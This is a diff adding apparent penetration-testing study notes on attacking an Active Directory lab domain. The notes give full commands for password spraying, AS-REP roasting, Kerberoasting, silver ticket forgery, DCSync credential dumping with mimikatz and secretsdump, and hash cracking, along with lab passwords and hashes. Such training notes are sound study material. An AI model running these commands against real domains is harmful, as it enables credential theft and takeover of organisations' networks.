@@ -2501,7 +2501,41 @@ Reference
   - store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat  
     `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 - Silver tickets
+  - Need 3 info to creat silver ticket: SPN password hash, domain SID, target SPN  
+  - Trying to access the web page on WEB04 as user jeff  
+    `PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04`  //unauthorized
+  - Use mimikatz to obtain NTLM hash of user account "iis_service" which mapped to the target SPN > NTLM 4d28cf5252d39971419580a51484ca09  
+    ```
+    mimikatz # privilege::debug
+    mimikatz # sekurlsa::logonpasswords
+    ```  
+  - Obtain domain SID > SID S-1-5-21-1987370270-658905905-1781884369-1105  
+    `PS C:\Users\jeff> whoami /user`
+  - target the HTTP SPN resource on WEB04  
+  - Forging the service ticket with the user jeffadmin > Golden ticket for 'jeffadmin @ corp.com' successfully submitted  
+    `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
+  - Listing Kerberos tickets to confirm the silver ticket is submitted to the current session  (Admin powershell)
+    `PS C:\Tools> klist`
+  - Accessing the SMB share with the silver ticket  
+    `PS C:\Tools> iwr -UseDefaultCredentials http://web04`
 - Domain controller synchronization
+  - Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in filtered set rights (All admin group have these rights assigned  
+  - dcsync attack in which we impersonate a domain controller  
+  - Using **Mimikatz** to perform a dcsync attack to obtain the credentials of dave > **credentials**: Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494  
+    ```
+    PS C:\Users\jeffadmin> cd C:\Tools\
+    PS C:\Tools> .\mimikatz.exe
+    mimikatz # lsadump::dcsync /user:corp\dave
+    ```
+  - Crack the NTLM hash > Flowers1  
+    `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - Using **secretsdump** to perform the dcsync attack to obtain the NTLM hash of dave > 08d7a47a6f9f66b97b1bae4178747494  
+    ```
+    kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+    ...
+    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+    ```
   
 ### 24. Lateral movement in active directory
 ### 25. Enumerating AWS Cloud Infrastruture
@@ -4223,6 +4257,94 @@ Reference
     `Find-LocalAdminAccess -Credential (New-Object System.Management.Automation.PSCredential("CORP\robert",(ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)))`  
   - RDP to client74  
     `xfreerdp3 /u:robert /p:'NewP@ssw0rd!' /d:corp.com /v:192.168.154.74 /cert:ignore /drive:share,/home/kali/share`
+
+### Attacking active drectiory authentication
+- `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`
+- `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.70 /cert:ignore /drive:share,/home/kali/share`
+- powershell -ep bypass
+- Import-Module .\PowerView.ps1
+
+- password attacks
+  - view policy  
+    `net accounts`
+  - Spray the credentials of pete against all domain joined machines with crackmapexec, which machine is pete a local administrator  
+    ```
+    Get-NetComputer | select CN, operatingsystem
+    crackmapexec smb 192.168.188.70-192.168.188.76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
+    ```
+- AS-REP Roasting
+  - Find Vulnerable Users Does not require Kerberos preauthentication > dave  
+    `kali@kali:~$ Get-DomainUser -PreauthNotRequired | Select-Object samaccountname`
+  - Request AS-REP  
+    `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.188.70  -request -outputfile hashes.asreproast corp.com/pete`
+  - crack the hash  
+    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+- Kerberoasting
+  - Use Rubeus to enumerate all domain user accounts with an SPN (service accounts) and request TGS tickets for them  
+    `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
+  - transfer hashes.kerberoast to kali  
+  - crack with hashcat (hash mode: Kerberos 5 TGS-REP)  
+    `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r add1.rule --force`  
+  - create custom rule (adds "1" to every password in rockyou.txt)  
+    `echo '$1' > add1.rule`  
+- Silver tickets
+  - Enable Debug Privileges in Mimikatz  
+    `mimikatz # privilege::debug`  
+  - Dump Logon Passwords (NTLM hash of the iis_service)  
+    `mimikatz # sekurlsa::logonpasswords`  
+  - Enumerate Domain Users > jeffadmin (can use any domain user)  
+    `PS C:\tools> Get-NetUser | select cn, whencreated`  
+  - Get Current User SID > S-1-5-21-1987370270-658905905-1781884369  
+    `PS C:\Users\jeff> whoami /user`
+  - Forge a Silver Ticket  
+    `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`  
+  - Check Injected Tickets (Admin powershell)  
+    `PS C:\Tools> klist`  
+  - Access Target Service with Forged Ticket  
+    `PS C:\Tools> (iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"`
+- Domain controller synchronization
+  - perform the dcsync attack to obtain the NTLM hash of the krbtgt account  
+    ```
+    PS C:\Users\jeffadmin> cd C:\Tools\
+    PS C:\Tools> .\mimikatz.exe
+    mimikatz # lsadump::dcsync /user:corp\krbtgt
+    kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+    ```
+- capstone access to DC1 (AS-REP roasting 'mike' + password spray (client75 admin) + mimikatz for maria)
+  - Find Vulnerable Users Does not require Kerberos preauthentication on DC  
+    `impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete` (Not working) OR
+    `impacket-GetNPUsers -dc-ip 192.168.158.70 corp.com/pete:Nexus123! -request -outputfile hashes2.asreproast`  
+  - Cracking the AS-REP hash with Hashcat > mike:Darkness1099! (Rules: add nothing, 1, or !)  
+    ```
+    append.rule
+    :
+    $1
+    $!
+
+    sudo hashcat -m 18200 hashes2.asreproast /usr/share/wordlists/rockyou.txt -r append.rule --force
+    ```
+  - Spray the new credential across all machines using crackmapexec  (mike is admin on client75)  
+    `nano users.txt`  `kali@kali:~$ crackmapexec smb 192.168.158.70-192.168.158.75 -u users.txt -p 'Darkness1099!' -d corp.com --continue-on-success`  
+  - Login to client75 with Mike user  
+    `xfreerdp3 /u:mike /d:corp.com /p:Darkness1099! /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`  
+  - Use mimikatz to perform post-exploitation and try logging into DC1. > passwordt_1415  
+    ```
+    mimikatz # privilege::debug
+    mimikatz # sekurlsa::logonpasswords
+    hashcat -m 1000 maria_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+    
+    xfreerdp3 /u:maria /d:corp.com /p:passwordt_1415 /v:192.168.158.70 /cert:ignore /drive:share,/home/kali/share  OR
+    rdesktop -u maria -p passwordt_1415 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70
+    ```
+- capstone access to DC1 (AS-REP roasting 'mike' + password spray (meg, backupuser) + admin login)
+  - Spray this password "VimForPowerShell123!" against the domain users 'meg' and 'backupuser'  
+    `kali@kali:~$ crackmapexec smb 192.168.158.70-192.168.158.75 -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success`
+  - Get SPN  
+    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.158.70 corp.com/meg`
+  - crack the hash  
+    `sudo hashcat -m 13100 meg.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - RDP to DC1 as 'backupser'  
+    `rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  
 
 ## Penetration testing report 
 - note editor:
